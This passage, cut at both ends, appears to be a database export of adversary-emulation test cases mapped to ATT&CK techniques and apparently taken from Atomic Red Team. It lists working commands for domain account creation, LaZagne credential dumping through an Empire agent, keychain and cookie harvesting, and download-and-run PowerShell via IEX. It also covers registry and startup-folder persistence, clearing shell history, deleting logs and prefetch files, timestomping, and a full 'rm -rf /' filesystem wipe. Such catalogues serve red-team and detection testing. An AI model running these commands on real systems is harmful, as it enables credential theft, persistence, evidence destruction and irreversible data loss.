System.DirectoryServices.AccountManagement\\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\\n$User.SamAccountName = $SamAccountName\\n$TempCred = New-Object System.Management.Automation.PSCredential('a'", " $AccountPassword)\\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\\n$User.Enabled = $True\\n$User.PasswordNotRequired = $False\\n$User.DisplayName = $SamAccountName\\n$User.Save()\\n$User\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new Domain Account using PowerShell", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "T1136.002_Admin"}, {"key": "password", "value": "T1136_pass123!"}], "execution_status": "Fail"}]}}}}
55	\N		\N	yes	P2	\N	2021-07-30 02:23:11.507436+00	T1555	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1555.bat using below commands.\\nagent_id> upload MuddyWater_T1555.bat\\nagent_id> shell MuddyWater_T1555.bat\\n\\nIt will dump all passwords using below command.\\nshell C:\\\\Users\\\\user\\\\laZagne.exe all -oA -output C:\\\\Users\\\\users\\\\"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.736Z", "pre-requisite": [], "pre-requistes": "On Windows target:\\n1. Download LaZagne source code from https://github.com/AlessandroZ/LaZagne on the endpoint.\\nOn Kali:\\n1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item \\"$env:TEMP\\\\windows-credentials.txt\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1555\\\\src\\\\T1555-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Extract\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract Windows Credential Manager via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"word.Application\\" | Out-Null\\n  $process = \\"winword\\"\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}]}}}}
320	\N		\N	yes	P2	\N	2021-07-30 03:11:01.599367+00	T1070.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "fsutil usn createjournal m=1000 a=100 c:\\n", "command": ["fsutil usn deletejournal /D C:\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Indicator Removal using FSUtil", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rm ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (rm)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["echo \\"\\" > ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (echo)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["cat /dev/null > ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (cat dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["ln -sf /dev/null ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (ln dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["truncate -s0 ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (truncate)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["unset HISTFILE\\nexport HISTFILESIZE=0\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear history of a bunch of shells", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "sed -i 's/set +o history//g' ~/.bashrc\\n. ~/.bashrc\\nset -o history\\n", "command": ["set +o history\\necho 'set +o history' >> ~/.bashrc\\n. ~/.bashrc\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear and Disable Bash History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["hostname\\nwhoami\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Use Space Before Command to Avoid Logging to History", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "userdel -f testuser1\\n", "command": ["sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable Bash History Logging with SSH -T", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["/usr/sbin/useradd testuser1\\necho pwd101! | passwd testuser1 --stdin\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Set-PSReadlineOption HistorySaveStyle SaveNothing\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Prevent Powershell History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-Item (Get-PSReadlineOption).HistorySavePath\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Powershell History by Deleting History File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
117	\N	\N	\N	yes	["1. Need macOS to tryout the attack emulation."]	\N	2021-08-24 14:11:29.833223+00	T1053.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.004/T1053.004.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.995Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
291	\N		\N	yes	P1	\N	2021-07-28 11:26:26.946339+00	T1547.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "REG DELETE \\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /V \\"Atomic Red Team\\" /f >nul 2>&1\\n", "command": ["REG ADD \\"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /V \\"Atomic Red Team\\" /t REG_SZ /F /D \\"#{command_to_execute}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Reg Key Run", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "command_to_execute", "value": "C:\\\\Path\\\\AtomicRedTeam.exe"}], "execution_status": "Pass"}, {"cleanup": "REG DELETE HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /f >nul 2>&1\\n", "command": ["REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\"#{thing_to_execute}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Reg Key RunOnce", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "thing_to_execute", "value": "C:\\\\Path\\\\AtomicRedTeam.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-ItemProperty -Path #{reg_key_path} -Name \\"NextRun\\" -Force -ErrorAction Ignore\\n", "command": ["$RunOnceKey = \\"#{reg_key_path}\\"\\nset-itemproperty $RunOnceKey \\"NextRun\\" '#{thing_to_execute} \\"IEX (New-Object Net.WebClient).DownloadString(`\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\\")\\"'\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell Registry RunOnce", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "thing_to_execute", "value": "powershell.exe"}, {"key": "reg_key_path", "value": "HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\" -ErrorAction Ignore\\nRemove-Item \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\" -ErrorAction Ignore\\n", "command": ["Copy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\"\\nCopy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\"\\ncscript.exe \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\"\\ncscript.exe \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Suspicious vbs file run from startup Folder", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\jsestartup.jse\\" -ErrorAction Ignore\\nRemove-Item \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\jsestartup.jse\\" -ErrorAction Ignore\\n", "command": ["Copy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\jsestartup.jse \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\jsestartup.jse\\"\\nCopy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\jsestartup.jse \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\jsestartup.jse\\"\\ncscript.exe /E:Jscript \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\jsestartup.jse\\"\\ncscript.exe /E:Jscript \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\jsestartup.jse\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Suspicious jse file run from startup Folder", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\" -ErrorAction Ignore\\nRemove-Item \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\" -ErrorAction Ignore\\n", "command": ["Copy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\"\\nCopy-Item $PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\"\\nStart-Process \\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\"\\nStart-Process \\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Suspicious bat file run from startup Folder", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$home\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\calc_exe.lnk\\" -ErrorAction Ignore", "command": ["$Target = \\"C:\\\\Windows\\\\System32\\\\calc.exe\\"\\n$ShortcutLocation = \\"$home\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\calc_exe.lnk\\"\\n$WScriptShell = New-Object -ComObject WScript.Shell\\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\\n$Create.TargetPath = $Target\\n$Create.Save()      "], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Add Executable Shortcut Link to User Startup Folder", "created_date": "28/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
127	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1098.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.004/T1098.004.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.110Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
305	\N		\N	yes	P2	\N	2021-07-30 02:23:57.022948+00	T1555.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}]}}}}
321	\N		\N	yes	P2	\N	2021-07-30 03:13:13.96929+00	T1070.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "fsutil usn createjournal m=1000 a=100 c:\\n", "command": ["fsutil usn deletejournal /D C:\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Indicator Removal using FSUtil", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rm ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (rm)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["echo \\"\\" > ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (echo)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["cat /dev/null > ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (cat dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["ln -sf /dev/null ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (ln dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["truncate -s0 ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (truncate)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["unset HISTFILE\\nexport HISTFILESIZE=0\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear history of a bunch of shells", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "sed -i 's/set +o history//g' ~/.bashrc\\n. ~/.bashrc\\nset -o history\\n", "command": ["set +o history\\necho 'set +o history' >> ~/.bashrc\\n. ~/.bashrc\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear and Disable Bash History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["hostname\\nwhoami\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Use Space Before Command to Avoid Logging to History", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "userdel -f testuser1\\n", "command": ["sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable Bash History Logging with SSH -T", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["/usr/sbin/useradd testuser1\\necho pwd101! | passwd testuser1 --stdin\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Set-PSReadlineOption HistorySaveStyle SaveNothing\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Prevent Powershell History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-Item (Get-PSReadlineOption).HistorySavePath\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Powershell History by Deleting History File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf #{folder_to_delete}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Linux/macOS", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "folder_to_delete", "value": "/tmp/victim-files"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["shred -u #{file_to_shred}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Overwrite and delete a file with shred", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_shred", "value": "/tmp/victim-shred.txt"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["del /f #{file_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{file_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rmdir /s /q #{folder_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{folder_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -path #{file_to_delete}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_to_delete", "value": "$env:TEMP\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path #{folder_to_delete} -Recurse\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "$env:TEMP\\\\deleteme_folder_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf / --no-preserve-root > /dev/null 2> /dev/null\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Delete Filesystem - Linux", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path (Join-Path \\"$Env:SystemRoot\\\\prefetch\\\\\\" (Get-ChildItem -Path \\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\" -Name)[0])\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete Prefetch File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item #{teamviewer_log_file}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete TeamViewer Log Files", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "teamviewer_log_file", "value": "$env:TEMP\\\\TeamViewer_54.log"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -m -t 197001010000.00 #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's modification timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["NOW=$(date)\\ndate -s \\"1970-01-01 00:00:00\\"\\ntouch #{target_filename}\\ndate -s \\"$NOW\\"\\nstat #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's creation timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -acmr #{reference_file_path} #{target_file_path}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Modify file timestamps using reference file", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_file_path", "value": "/opt/filename"}, {"key": "reference_file_path", "value": "/bin/sh"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.CreationTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file creation timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastWriteTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last modified timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastAccessTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last access timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\timestomp.ps1 -ErrorAction Ignore\\nRemove-Item #{file_path}\\\\kxwn.lock -ErrorAction Ignore", "command": ["import-module #{file_path}\\\\timestomp.ps1\\ntimestomp -dest \\"#{file_path}\\\\kxwn.lock\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Timestomp a File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path -path \\"#{file_path}\\\\kxwn.lock\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "$env:appdata\\\\Microsoft"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\"test share\\" 